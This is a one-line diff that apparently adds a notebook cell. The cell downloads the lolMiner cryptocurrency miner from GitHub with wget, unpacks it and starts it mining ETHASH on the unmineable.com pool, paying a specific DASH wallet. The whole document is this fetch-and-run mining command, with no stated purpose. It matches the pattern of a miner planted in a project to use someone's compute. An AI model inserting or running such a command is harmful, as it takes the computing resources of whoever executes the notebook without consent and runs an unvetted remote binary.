@@ -1,0 +1,1 @@
+ !wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DASH:XnbJDGfcCjRc9RuKGJJdsiNuc1PiRhYk12.simaster19#zna0-h21q -t 39 
